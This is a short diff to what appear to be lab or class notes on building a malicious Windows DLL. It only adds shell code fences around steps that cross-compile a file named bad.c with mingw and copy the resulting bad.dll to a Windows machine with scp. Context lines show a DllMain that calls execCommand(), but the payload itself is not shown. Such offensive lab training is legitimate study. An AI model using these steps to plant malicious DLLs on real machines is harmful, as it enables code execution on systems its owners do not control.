@@ -9,6 +9,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
  execCommand();
  return 0;
 }
+```shell
 # Create Nano file on linux with code
 cd into folder with bad.c in it
 run the below command on the file
@@ -17,3 +18,4 @@ i686-w64-mingw32-g++ -c bad.c -o bad.o
 # now move over to windows box
 scp student@10.50.34.63:/home/student/bad.dll .
 # THis will pull the file from the linux-ops to the windows machine
+```
